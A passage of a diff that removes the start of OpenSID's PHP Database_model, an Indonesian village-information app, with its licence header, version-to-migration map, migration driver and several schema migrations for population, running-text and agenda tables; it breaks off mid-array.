@@ -1,3798 +1,489 @@
-<?php
-
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * File ini:
- *
- * Model untuk modul Database
- *
- * donjo-app/models/Database_model.php
- *
- */
-
-/**
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2020 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package	OpenSID
- * @author	Tim Pengembang OpenDesa
- * @copyright	Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright	Hak Cipta 2016 - 2020 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license	http://www.gnu.org/licenses/gpl.html	GPL V3
- * @link 	https://github.com/OpenSID/OpenSID
- */
-
-class Database_model extends CI_Model {
-
-	private $user = 1;
-
-	private $engine = 'InnoDB';
-	/* define versi opensid dan script migrasi yang harus dijalankan */
-	private $versionMigrate = array(
-		'2.4' => array('migrate' => 'migrasi_24_ke_25','nextVersion' => '2.5'),
-		'pra-2.5' => array('migrate' => 'migrasi_24_ke_25','nextVersion' => '2.5'),
-		'2.5' => array('migrate' => 'migrasi_25_ke_26', 'nextVersion' => '2.6'),
-		'2.6' => array('migrate' => 'migrasi_26_ke_27', 'nextVersion' => '2.7'),
-		'2.7' => array('migrate' => 'migrasi_27_ke_28', 'nextVersion' => '2.8'),
-		'2.8' => array('migrate' => 'migrasi_28_ke_29', 'nextVersion' => '2.9'),
-		'2.9' => array('migrate' => 'migrasi_29_ke_210', 'nextVersion' => '2.10'),
-		'2.10' => array('migrate' => 'migrasi_210_ke_211', 'nextVersion' => '2.11'),
-		'2.11' => array('migrate' => 'migrasi_211_ke_1806', 'nextVersion' => '18.06'),
-		'2.12' => array('migrate' => 'migrasi_211_ke_1806', 'nextVersion' => '18.06'),
-		'18.06' => array('migrate' => 'migrasi_1806_ke_1807', 'nextVersion' => '18.08'),
-		'18.07' => array('migrate' => 'migrasi_1806_ke_1807', 'nextVersion' => '18.08'),
-		'18.08' => array('migrate' => 'migrasi_1808_ke_1809', 'nextVersion' => '18.09'),
-		'18.09' => array('migrate' => 'migrasi_1809_ke_1810', 'nextVersion' => '18.10'),
-		'18.10' => array('migrate' => 'migrasi_1810_ke_1811', 'nextVersion' => '18.11'),
-		'18.11' => array('migrate' => 'migrasi_1811_ke_1812', 'nextVersion' => '18.12'),
-		'18.12' => array('migrate' => 'migrasi_1812_ke_1901', 'nextVersion' => '19.01'),
-		'19.01' => array('migrate' => 'migrasi_1901_ke_1902', 'nextVersion' => '19.02'),
-		'19.02' => array('migrate' => 'nop', 'nextVersion' => '19.03'),
-		'19.03' => array('migrate' => 'migrasi_1903_ke_1904', 'nextVersion' => '19.04'),
-		'19.04' => array('migrate' => 'migrasi_1904_ke_1905', 'nextVersion' => '19.05'),
-		'19.05' => array('migrate' => 'migrasi_1905_ke_1906', 'nextVersion' => '19.06'),
-		'19.06' => array('migrate' => 'migrasi_1906_ke_1907', 'nextVersion' => '19.07'),
-		'19.07' => array('migrate' => 'migrasi_1907_ke_1908', 'nextVersion' => '19.08'),
-		'19.08' => array('migrate' => 'migrasi_1908_ke_1909', 'nextVersion' => '19.09'),
-		'19.09' => array('migrate' => 'migrasi_1909_ke_1910', 'nextVersion' => '19.10'),
-		'19.10' => array('migrate' => 'migrasi_1910_ke_1911', 'nextVersion' => '19.11'),
-		'19.11' => array('migrate' => 'migrasi_1911_ke_1912', 'nextVersion' => '19.12'),
-		'19.12' => array('migrate' => 'migrasi_1912_ke_2001', 'nextVersion' => '20.01'),
-		'20.01' => array('migrate' => 'migrasi_2001_ke_2002', 'nextVersion' => '20.02'),
-		'20.02' => array('migrate' => 'migrasi_2002_ke_2003', 'nextVersion' => '20.03'),
-		'20.03' => array('migrate' => 'migrasi_2003_ke_2004', 'nextVersion' => '20.04'),
-		'20.04' => array('migrate' => 'migrasi_2004_ke_2005', 'nextVersion' => '20.05'),
-		'20.05' => array('migrate' => 'migrasi_2005_ke_2006', 'nextVersion' => '20.06'),
-		'20.06' => array('migrate' => 'migrasi_2006_ke_2007', 'nextVersion' => '20.07'),
-		'20.07' => array('migrate' => 'migrasi_2007_ke_2008', 'nextVersion' => '20.08'),
-		'20.08' => array('migrate' => 'migrasi_2008_ke_2009', 'nextVersion' => '20.09'),
-		'20.09' => array('migrate' => 'migrasi_2009_ke_2010', 'nextVersion' => '20.10'),
-		'20.10' => array('migrate' => 'migrasi_2010_ke_2011', 'nextVersion' => '20.11'),
-		'20.11' => array('migrate' => 'migrasi_2011_ke_2012', 'nextVersion' => '20.12'),
-		'20.12' => array('migrate' => 'migrasi_2012_ke_2101', 'nextVersion' => '21.01'),
-		'21.01' => array('migrate' => 'migrasi_2101_ke_2102', 'nextVersion' => '21.02'),
-		'21.02' => array('migrate' => 'migrasi_2102_ke_2103', 'nextVersion' => '21.03'),
-		'21.03' => array('migrate' => 'migrasi_2103_ke_2104', 'nextVersion' => '21.04'),
-		'21.04' => array('migrate' => 'migrasi_2104_ke_2105', 'nextVersion' => '21.05'),
-		'21.05' => array('migrate' => 'migrasi_2105_ke_2106', 'nextVersion' => '21.06'),
-		'21.06' => array('migrate' => 'migrasi_2106_ke_2107', 'nextVersion' => '21.07'),
-		'21.07' => array('migrate' => 'migrasi_2107_ke_2108', 'nextVersion' => '21.08'),
-		'21.08' => array('migrate' => 'migrasi_2108_ke_2109', 'nextVersion' => '21.09'),
-		'21.09' => array('migrate' => 'migrasi_2109_ke_2110', 'nextVersion' => '21.10'),
-		'21.10' => array('migrate' => 'migrasi_2110_ke_2111', 'nextVersion' => null),
-	);
-
-	public function __construct()
-	{
-		parent::__construct();
-
-		$this->load->dbutil();
-		if( ! $this->dbutil->database_exists($this->db->database)) return;
-
-		$this->cek_engine_db();
-		$this->load->dbforge();
-		$this->load->model('surat_master_model');
-		$this->load->model('analisis_import_model');
-		$this->user = $this->session_user ?: 1;
-	}
-
-	private function cek_engine_db()
-	{
-		$this->db->db_debug = FALSE; //disable debugging for queries
-
-			$query = $this->db->query("SELECT `engine` FROM INFORMATION_SCHEMA.TABLES WHERE table_schema= '". $this->db->database ."' AND table_name = 'user'");
-			$error = $this->db->error();
-			if ($error['code'] != 0)
-			{
-				$this->engine = $query->row()->engine;
-			}
-
-		$this->db->db_debug = $db_debug; //restore setting
-	}
-
-	private function reset_setting_aplikasi()
-	{
-		$this->db->truncate('setting_aplikasi');
-		$query = "
-			INSERT INTO setting_aplikasi (`id`, `key`, `value`, `keterangan`, `jenis`,`kategori`) VALUES
-			(1, 'sebutan_kabupaten','kabupaten','Pengganti sebutan wilayah kabupaten','',''),
-			(2, 'sebutan_kabupaten_singkat','kab.','Pengganti sebutan singkatan wilayah kabupaten','',''),
-			(3, 'sebutan_kecamatan','kecamatan','Pengganti sebutan wilayah kecamatan','',''),
-			(4, 'sebutan_kecamatan_singkat','kec.','Pengganti sebutan singkatan wilayah kecamatan','',''),
-			(5, 'sebutan_desa','desa','Pengganti sebutan wilayah desa','',''),
-			(6, 'sebutan_dusun','dusun','Pengganti sebutan wilayah dusun','',''),
-			(7, 'sebutan_camat','camat','Pengganti sebutan jabatan camat','',''),
-			(8, 'website_title','Website Resmi','Judul tab browser modul web','','web'),
-			(9, 'login_title','OpenSID', 'Judul tab browser halaman login modul administrasi','',''),
-			(10, 'admin_title','Sistem Informasi Desa','Judul tab browser modul administrasi','',''),
-			(11, 'web_theme', 'default','Tema penampilan modul web','','web'),
-			(12, 'offline_mode',FALSE,'Apakah modul web akan ditampilkan atau tidak','boolean',''),
-			(13, 'enable_track',TRUE,'Apakah akan mengirimkan data statistik ke tracker','boolean',''),
-			(14, 'dev_tracker','','Host untuk tracker pada development','','development'),
-			(15, 'nomor_terakhir_semua_surat', FALSE,'Gunakan nomor surat terakhir untuk seluruh surat tidak per jenis surat','boolean',''),
-			(16, 'google_key','','Google API Key untuk Google Maps','','web'),
-			(17, 'libreoffice_path','','Path tempat instal libreoffice di server SID','','')
-		";
-		$this->db->query($query);
-	}
-
-	public function migrasi_db_cri()
-	{
-
-		// Tunggu restore selesai sebelum migrasi
-		if (isset($this->session->sedang_restore) && $this->session->sedang_restore == 1) return;
-
-	 	$_SESSION['success'] = 1;
-		$versi = $this->getCurrentVersion();
-		$nextVersion = $versi;
-		$versionMigrate = $this->versionMigrate;
-		if (isset($versionMigrate[$versi]))
-		{
-			while (!empty($nextVersion) AND !empty($versionMigrate[$nextVersion]['migrate']))
-			{
-				$migrate = $versionMigrate[$nextVersion]['migrate'];
-				log_message('error', 'Jalankan '.$migrate);
-				$nextVersion = $versionMigrate[$nextVersion]['nextVersion'];
-				if (method_exists($this, $migrate))
-					call_user_func(__NAMESPACE__ .'\\Database_model::'.$migrate);
-				else
-					$this->jalankan_migrasi($migrate);
-			}
-		}
-		else
-		{
-			$this->_migrasi_db_cri();
-		}
-		// Jalankan migrasi untuk fitur premium
-		$this->jalankan_migrasi('migrasi_fitur_premium');
-
-		$this->folder_desa_model->amankan_folder_desa();
-		$this->surat_master_model->impor_surat_desa();
-		$this->db->where('id', 13)->update('setting_aplikasi', array('value' => TRUE));
-		/*
-			Update current_version di db.
-			'pasca-<versi>' atau '<versi>-pasca disimpan sebagai '<versi>'
-		*/
-		$versi = AmbilVersi();
-		$versi = preg_replace('/-premium.*|pasca-|-pasca/', '', $versi);
-		$newVersion = array(
-			'value' => $versi
-		);
-		$this->db->where(array('key' => 'current_version'))->update('setting_aplikasi', $newVersion);
-		$this->load->model('track_model');
-		$this->track_model->kirim_data();
-		$this->catat_versi_database();
-  }
-
-  private function catat_versi_database()
-  {
-		// Catat migrasi ini telah dilakukan
-		$sudah = $this->db->where('versi_database', VERSI_DATABASE)
-			->get('migrasi')->num_rows();
-		if (! $sudah) $this->db->insert('migrasi', array('versi_database' => VERSI_DATABASE));
-	}
-
-  private function getCurrentVersion()
-  {
-		// Untuk kasus tabel setting_aplikasi belum ada
-		if (!$this->db->table_exists('setting_aplikasi')) return NULL;
-		$result = NULL;
-		$_result = $this->db->where(array('key' => 'current_version'))->get('setting_aplikasi')->row();
-		if (!empty($_result))
-		{
-		  $result = $_result->value;
-		}
-		return $result;
-  }
-
-  private function versi_database_terbaru()
-  {
-		$sudah = false;
-		if ($this->db->table_exists('migrasi') )
-			$sudah = $this->db->where('versi_database', VERSI_DATABASE)
-				->get('migrasi')->num_rows();
-		return $sudah;
-  }
-
-	// Cek apakah migrasi perlu dijalankan
-	public function cek_migrasi()
-	{
-		// Paksa menjalankan migrasi kalau belum
-		// Migrasi direkam di tabel migrasi
-		if ( ! $this->versi_database_terbaru() && empty($this->session->error_premium))
-		{
-			// Ulangi migrasi terakhir
-			$terakhir = key(array_slice($this->versionMigrate, -1, 1, true));
-			$sebelumnya = key(array_slice($this->versionMigrate, -2, 1, true));
-			$this->versionMigrate[$terakhir]['migrate'] ?: $this->versionMigrate[$terakhir]['migrate'] = $this->versionMigrate[$sebelumnya]['migrate'];
-
-			$this->migrasi_db_cri();
-		}
-	}
-
-
-  private function _migrasi_db_cri()
-  {
-		$this->migrasi_cri_lama();
-		$this->migrasi_03_ke_04();
-		$this->migrasi_08_ke_081();
-		$this->migrasi_082_ke_09();
-		$this->migrasi_092_ke_010();
-		$this->migrasi_010_ke_10();
-		$this->migrasi_10_ke_11();
-		$this->migrasi_111_ke_12();
-		$this->migrasi_124_ke_13();
-		$this->migrasi_13_ke_14();
-		$this->migrasi_14_ke_15();
-		$this->migrasi_15_ke_16();
-		$this->migrasi_16_ke_17();
-		$this->migrasi_17_ke_18();
-		$this->migrasi_18_ke_19();
-		$this->migrasi_19_ke_110();
-		$this->migrasi_110_ke_111();
-		$this->migrasi_111_ke_112();
-		$this->migrasi_112_ke_113();
-		$this->migrasi_113_ke_114();
-		$this->migrasi_114_ke_115();
-		$this->migrasi_115_ke_116();
-		$this->migrasi_116_ke_117();
-		$this->migrasi_117_ke_20();
-		$this->migrasi_20_ke_21();
-		$this->migrasi_21_ke_22();
-		$this->migrasi_22_ke_23();
-		$this->migrasi_23_ke_24();
-		$this->migrasi_24_ke_25();
-		$this->migrasi_25_ke_26();
-		$this->migrasi_26_ke_27();
-		$this->migrasi_27_ke_28();
-		$this->migrasi_28_ke_29();
-		$this->migrasi_29_ke_210();
-		$this->migrasi_210_ke_211();
-		$this->migrasi_211_ke_1806();
-		$this->migrasi_1806_ke_1807();
-		$this->migrasi_1808_ke_1809();
-		$this->migrasi_1809_ke_1810();
-		$this->migrasi_1810_ke_1811();
-		$this->migrasi_1811_ke_1812();
-		$this->migrasi_1812_ke_1901();
-		$this->migrasi_1901_ke_1902();
-		$this->migrasi_1903_ke_1904();
-		$this->migrasi_1904_ke_1905();
-		$this->migrasi_1905_ke_1906();
-		$this->migrasi_1906_ke_1907();
-		$this->migrasi_1907_ke_1908();
-		$this->migrasi_1908_ke_1909();
-		$this->migrasi_1909_ke_1910();
-		$this->migrasi_1910_ke_1911();
-		$this->migrasi_1911_ke_1912();
-		$this->jalankan_migrasi('migrasi_1912_ke_2001');
-		$this->jalankan_migrasi('migrasi_2001_ke_2002');
-		$this->jalankan_migrasi('migrasi_2002_ke_2003');
-		$this->jalankan_migrasi('migrasi_2003_ke_2004');
-		$this->jalankan_migrasi('migrasi_2004_ke_2005');
-		$this->jalankan_migrasi('migrasi_2005_ke_2006');
-		$this->jalankan_migrasi('migrasi_2006_ke_2007');
-		$this->jalankan_migrasi('migrasi_2007_ke_2008');
-		$this->jalankan_migrasi('migrasi_2008_ke_2009');
-		$this->jalankan_migrasi('migrasi_2009_ke_2010');
-		$this->jalankan_migrasi('migrasi_2010_ke_2011');
-		$this->jalankan_migrasi('migrasi_2101_ke_2102');
-  }
-
-  private function jalankan_migrasi($migrasi)
-  {
-  	$this->load->model('migrations/'.$migrasi);
-  	$this->$migrasi->up();
-  }
-
-  private function migrasi_1911_ke_1912()
-  {
-  	$this->load->model('migrations/migrasi_default_value');
-  	$this->migrasi_default_value->up();
-  	$this->load->model('migrations/migrasi_1911_ke_1912');
-  	$this->migrasi_1911_ke_1912->up();
-  }
-
-  private function migrasi_1910_ke_1911()
-  {
-  	$this->load->model('migrations/migrasi_1910_ke_1911');
-  	$this->migrasi_1910_ke_1911->up();
-  }
-
-  private function migrasi_1909_ke_1910()
-  {
-  	$this->load->model('migrations/migrasi_1909_ke_1910');
-  	$this->migrasi_1909_ke_1910->up();
-  }
-
-  private function migrasi_1908_ke_1909()
-  {
-  	$this->load->model('migrations/migrasi_1908_ke_1909');
-  	$this->migrasi_1908_ke_1909->up();
-  }
-
-  private function migrasi_1907_ke_1908()
-  {
-  	$this->load->model('migrations/migrasi_1907_ke_1908');
-  	$this->migrasi_1907_ke_1908->up();
-  }
-
-  private function migrasi_1906_ke_1907()
-  {
-  	$this->load->model('migrations/migrasi_1906_ke_1907');
-  	$this->migrasi_1906_ke_1907->up();
-  }
-
-  private function migrasi_1905_ke_1906()
-  {
-  	// Tambah kolom waktu update dan user pengupdate
-  	if (!$this->db->field_exists('created_at', 'tweb_penduduk'))
-  	{
-			// Tambah kolom
-			$this->dbforge->add_field("created_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP");
-			$fields = array();
-			$fields['created_by'] = array(
-					'type' => 'int',
-					'constraint' => 11,
-				  'null' => FALSE,
-			);
-			$this->dbforge->add_column('tweb_penduduk', $fields);
-		}
-  	if (!$this->db->field_exists('updated_at', 'tweb_penduduk'))
-  	{
-			// Tambah kolom
-			$this->dbforge->add_field("updated_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP");
-		}
-		$fields = array();
-		$fields['updated_by'] = array(
-				'type' => 'int',
-				'constraint' => 11,
-			  'null' => TRUE,
-				'default' => NULL
-		);
-  	if (!$this->db->field_exists('updated_by', 'tweb_penduduk'))
-			$this->dbforge->add_column('tweb_penduduk', $fields);
-		else
-		  $this->dbforge->modify_column('tweb_penduduk', $fields);
-
-  	// Tambah menu teks berjalan
-		$data = array(
-			'id' => '64',
-			'modul' => 'Teks Berjalan',
-			'url' => 'teks_berjalan',
-			'aktif' => '1',
-			'ikon' => 'fa-ellipsis-h',
-			'urut' => '9',
-			'level' => '2',
-			'parent' => '13',
-			'hidden' => '0',
-			'ikon_kecil' => 'fa-ellipsis-h'
-		);
-		$sql = $this->db->insert_string('setting_modul', $data) . " ON DUPLICATE KEY UPDATE url = VALUES(url), ikon = VALUES(ikon), ikon_kecil = VALUES(ikon_kecil)";
-		$this->db->query($sql);
-
-		if (!$this->db->table_exists('teks_berjalan'))
-		{
-			$query = "
-			CREATE TABLE `teks_berjalan` (
-				`id` int(11) NOT NULL AUTO_INCREMENT,
-				`teks` text,
-				`urut` int(5),
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11),
-				`status` int(1) NOT NULL DEFAULT '0',
-				PRIMARY KEY (id)
-			)
-			";
-			$this->db->query($query);
-
-			$setting_teks_berjalan = $this->db->select('id, value')->where('key','isi_teks_berjalan')->get('setting_aplikasi')->row();
-			if ($setting_teks_berjalan)
-			{
-				// ambil teks, tulis ke tabel teks_berjalan
-				// hapus setting
-				$isi_teks = $setting_teks_berjalan->value;
-				$data = array(
-					'teks' => $isi_teks,
-					'created_by' => $this->user
-				);
-				$this->db->insert('teks_berjalan', $data);
-				$this->db->where('key','isi_teks_berjalan')->delete('setting_aplikasi');
-			}
-			else
-			{
-				// ambil teks dari artikel, tulis ke tabel teks_berjalan
-				// hapus artikel
-				$id_kategori = $this->db->select('id')->where('kategori', 'teks_berjalan')->limit(1)->get('kategori')->row()->id;
-				if ($id_kategori)
-				{
-					// Ambil teks dari artikel
-					$teks = $this->db->select('a.isi, a.enabled')
-						->from('artikel a')
-						->join('kategori k', 'a.id_kategori = k.id', 'left')
-						->where('k.kategori', 'teks_berjalan')
-						->get()->result_array();
-					foreach ($teks as $data)
-					{
-						$isi_teks = strip_tags($data['isi']);
-						$isi = array(
-							'teks' => $isi_teks,
-							'status' => $data['enabled'],
-							'created_by' => $this->user
-						);
-						$this->db->insert('teks_berjalan', $isi);
-					}
-					// Hapus artikel dan kategori teks berjalan
-					$this->db->where('id_kategori', $id_kategori)->delete('artikel');
-					$this->db->where('kategori', 'teks_berjalan')->delete('kategori');
-				}
-			}
-		}
-  	// Tambah tautan pada teks berjalan
-  	if (!$this->db->field_exists('tautan', 'teks_berjalan'))
-  	{
-			// Tambah kolom
-			$fields = array();
-			$fields['tautan'] = array(
-					'type' => 'varchar',
-					'constraint' => 150,
-			);
-			$fields['judul_tautan'] = array(
-					'type' => 'varchar',
-					'constraint' => 150,
-			);
-			$this->dbforge->add_column('teks_berjalan', $fields);
-		}
-
-  	// Hapus menu SID dan Donasi
-		$this->db->where('id', 16)->delete('setting_modul');
-		$this->db->where('id', 19)->delete('setting_modul');
-
-  	$fields = $this->db->field_data('tweb_penduduk');
-  	$lookup = array_column($fields, NULL, 'name');   // re-index by 'name'
-  	$field_berat_lahir = $lookup['berat_lahir'];
-  	if (strtolower($field_berat_lahir->type) == 'varchar')
-  	{
-	  	// Ubah berat lahir dari kg menjadi gram
-	  	$list_penduduk = $this->db->select('id, berat_lahir')->get('tweb_penduduk')->result_array();
-	  	foreach ($list_penduduk as $penduduk)
-	  	{
-	  		// Kolom berat_lahir tersimpan sebagai varchar
-	  		$berat_lahir = (float)str_replace(',', '.', preg_replace('/[^0-9,\.]/','', $penduduk['berat_lahir']));
-	  		if ($berat_lahir < 100.0)
-	  		{
-	  			$berat_lahir = (int)($berat_lahir * 1000.0);
-	  			$this->db->where('id', $penduduk['id'])->update('tweb_penduduk', array('berat_lahir' => $berat_lahir));
-	  		}
-	  	}
-	  	// Ganti kolom berat_lahir menjadi bilangan
-		  $this->dbforge->modify_column('tweb_penduduk', array('berat_lahir' => array('type' => 'SMALLINT')));
-  	}
-  	// Di tweb_penduduk ubah kelahiran_anak_ke supaya default NULL
-	  $this->dbforge->modify_column('tweb_penduduk', array('kelahiran_anak_ke' => array('type' => 'TINYINT', 'constraint' => 2, 'default' => NULL)));
-
-	  // Ubah kolom tweb_penduduk supaya boleh null
-		$fields = array();
-		$fields['ktp_el'] = array(
-				'type' => 'TINYINT',
-				'constraint' => 4,
-			  'null' => TRUE,
-				'default' => NULL
-		);
-		$fields['status_rekam'] = array(
-				'type' => 'TINYINT',
-				'constraint' => 4,
-			  'null' => TRUE,
-				'default' => NULL
-		);
-		$fields['tempat_dilahirkan'] = array(
-				'type' => 'TINYINT',
-				'constraint' => 2,
-			  'null' => TRUE,
-				'default' => NULL
-		);
-		$fields['jenis_kelahiran'] = array(
-				'type' => 'TINYINT',
-				'constraint' => 2,
-			  'null' => TRUE,
-				'default' => NULL
-		);
-		$fields['penolong_kelahiran'] = array(
-				'type' => 'TINYINT',
-				'constraint' => 2,
-			  'null' => TRUE,
-				'default' => NULL
-		);
-		$fields['panjang_lahir'] = array(
-				'type' => 'VARCHAR',
-				'constraint' => 10,
-			  'null' => TRUE,
-				'default' => NULL
-		);
-		$fields['sakit_menahun_id'] = array(
-				'type' => 'INT',
-				'constraint' => 11,
-			  'null' => TRUE,
-				'default' => NULL
-		);
-	  $this->dbforge->modify_column('tweb_penduduk', $fields);
-  }
-
-  private function migrasi_1904_ke_1905()
-  {
-  	// Tambah kolom penduduk
-  	if (!$this->db->field_exists('tag_id_card', 'tweb_penduduk'))
-  	{
-			// Tambah kolom
-			$fields = array();
-			$fields['tag_id_card'] = array(
-					'type' => 'VARCHAR',
-					'constraint' => 15,
-					'default' => NULL
-			);
-			$this->dbforge->add_column('tweb_penduduk', $fields);
-		}
-  	// Tambah form admin aparatur desa
-		$this->db->where('isi','aparatur_desa.php')->update('widget',array('form_admin'=>'web_widget/admin/aparatur_desa'));
-  	// Konversi data suplemen terdata ke id
-  	$jml = $this->db->select('count(id) as jml')
-  		->where('id_terdata <>', '0')
-  		->where('char_length(id_terdata) <> 16')
-  		->get('suplemen_terdata')
-  		->row()->jml;
-  	if ($jml == 0)
-  	{
-	  	$terdata = $this->db->select('s.id as s_id, s.id_terdata, s.sasaran,
-	  		(case when s.sasaran = 1 then p.id else k.id end) as id')
-	  		->from('suplemen_terdata s')
-	  		->join('tweb_keluarga k', 'k.no_kk = s.id_terdata', 'left')
-	  		->join('tweb_penduduk p', 'p.nik = s.id_terdata', 'left')
-	  		->get()
-	  		->result_array();
-	  	foreach ($terdata as $data)
-	  	{
-				$this->db
-					->where('id', $data['s_id'])
-					->update('suplemen_terdata', array('id_terdata' => $data['id']));
-	   	}
-	  }
-
-		$this->db->where('id', 62)->update('setting_modul', array('url'=>'gis/clear', 'aktif'=>'1'));
-		// Tambah surat keterangan penghasilan orangtua
-		$data = array(
-			'nama'=>'Keterangan Penghasilan Orangtua',
-			'url_surat'=>'surat_ket_penghasilan_orangtua',
-			'kode_surat'=>'S-42',
-			'jenis'=>1);
-		$sql = $this->db->insert_string('tweb_surat_format', $data);
-		$sql .= " ON DUPLICATE KEY UPDATE
-				nama = VALUES(nama),
-				url_surat = VALUES(url_surat),
-				kode_surat = VALUES(kode_surat),
-				jenis = VALUES(jenis)";
-		$this->db->query($sql);
-  }
-
-  private function migrasi_1903_ke_1904()
-  {
-		$this->db->where('id', 59)->update('setting_modul', array('url'=>'dokumen_sekretariat/clear/2', 'aktif'=>'1'));
-		$this->db->where('id', 60)->update('setting_modul', array('url'=>'dokumen_sekretariat/clear/3', 'aktif'=>'1'));
-  	// Tambah tabel agenda
-		$tb = 'agenda';
-		if (!$this->db->table_exists($tb))
-		{
-			$this->dbforge->add_field(array(
-				'id' => array(
-					'type' => 'INT',
-					'constraint' => 11,
-					'auto_increment' => TRUE
-				),
-				'id_artikel' => array(
-					'type' => 'INT',
-					'constraint' => 11
-				),
-				'tgl_agenda' => array(
-					'type' => 'timestamp'
-				),
-				'koordinator_kegiatan' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 50
-				),
-				'lokasi_kegiatan' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 100
-				)
-			));
-			$this->dbforge->add_key('id', true);
-			$this->dbforge->create_table($tb, false, array('ENGINE' => $this->engine));
-			$this->dbforge->add_column(
-				'agenda',
-				array('CONSTRAINT `id_artikel_fk` FOREIGN KEY (`id_artikel`) REFERENCES `artikel` (`id`) ON DELETE CASCADE ON UPDATE CASCADE')
-			);
-		}
-		// Pindahkan tgl_agenda kalau sudah sempat membuatnya
-  	if ($this->db->field_exists('tgl_agenda', 'artikel'))
-  	{
-  		$data = $this->db->select('id, tgl_agenda')->where('id_kategori', AGENDA)
-  			->get('artikel')
-  			->result_array();
-  		if (count($data))
-  		{
-	  		$artikel_agenda = array();
-	  		foreach ($data as $agenda)
-	  		{
-	  			$artikel_agenda[] = array('id_artikel'=>$agenda['id'], 'tgl_agenda'=>$agenda['tgl_agenda']);
-	  		}
-	  		$this->db->insert_batch('agenda', $artikel_agenda);
-  		}
-			$this->dbforge->drop_column('artikel', 'tgl_agenda');
-  	}
-		// Tambah tombol media sosial whatsapp
-		$query = "
-			INSERT INTO media_sosial (id, gambar, link, nama, enabled) VALUES ('6', 'wa.png', '', 'WhatsApp', '1')
-			ON DUPLICATE KEY UPDATE
-				gambar = VALUES(gambar),
-				nama = VALUES(nama)";
-		$this->db->query($query);
-		// Tambahkan setting aplikasi untuk mengubah warna tema komponen Admin
-		$query = $this->db->select('1')->where('key', 'warna_tema_admin')->get('setting_aplikasi');
-		if (!$query->result())
-		{
-			$data = array(
-				'key' => 'warna_tema_admin',
-				'value' => $setting->value ?: 'skin-purple',
-				'jenis' => 'option-value',
-				'keterangan' => 'Warna dasar tema komponen Admin'
-			);
-			$this->db->insert('setting_aplikasi', $data);
-			$setting_id = $this->db->insert_id();
-			$this->db->insert_batch(
-				'setting_aplikasi_options',
-				array(
-					array('id_setting'=>$setting_id, 'value'=>'skin-blue'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-blue-light'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-yellow'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-yellow-light'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-green'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-green-light'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-purple'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-purple-light'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-red'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-red-light'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-black'),
-					array('id_setting'=>$setting_id, 'value'=>'skin-black-light')
-				)
-			);
-		}
-  }
-
-  private function migrasi_1901_ke_1902()
-  {
-  	// Ubah judul status hubungan dalam keluarga
-  	$this->db->where('id', 9)->update('tweb_penduduk_hubungan', array('nama' => 'FAMILI'));
-  	// Perpanjang nomor surat di surat masuk dan keluar
-	  $this->dbforge->modify_column('surat_masuk', array('nomor_surat' => array('name'  =>  'nomor_surat', 'type' =>  'VARCHAR',  'constraint'  =>  35 )));
-	  $this->dbforge->modify_column('surat_keluar', array('nomor_surat' => array('name'  =>  'nomor_surat', 'type' =>  'VARCHAR',  'constraint'  =>  35 )));
-  	// Tambah setting program bantuan yg ditampilkan di dashboard
-		$query = $this->db->select('1')->where('key', 'dashboard_program_bantuan')->get('setting_aplikasi');
-		$query->result() OR	$this->db->insert('setting_aplikasi', array('key'=>'dashboard_program_bantuan', 'value'=>'1	', 'jenis'=>'int', 'keterangan'=>"ID program bantuan yang ditampilkan di dashboard", 'kategori'=>'dashboard'));
-  	// Tambah setting panjang nomor surat
-		$query = $this->db->select('1')->where('key', 'panjang_nomor_surat')->get('setting_aplikasi');
-		$query->result() OR	$this->db->insert('setting_aplikasi', array('key'=>'panjang_nomor_surat', 'value'=>'', 'jenis'=>'int', 'keterangan'=>"Nomor akan diisi '0' di sebelah kiri, kalau perlu", 'kategori'=>'surat'));
-  	// Tambah rincian pindah di log_penduduk
-		$tb_option = 'ref_pindah';
-		if (!$this->db->table_exists($tb_option))
-		{
-			$this->dbforge->add_field(array(
-				'id' => array(
-					'type' => 'TINYINT',
-					'constraint' => 4
-				),
-				'nama' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 50
-				)
-			));
-			$this->dbforge->add_key('id', true);
-			$this->dbforge->create_table($tb_option, false, array('ENGINE' => $this->engine));
-			$this->db->insert_batch(
-				$tb_option,
-				array(
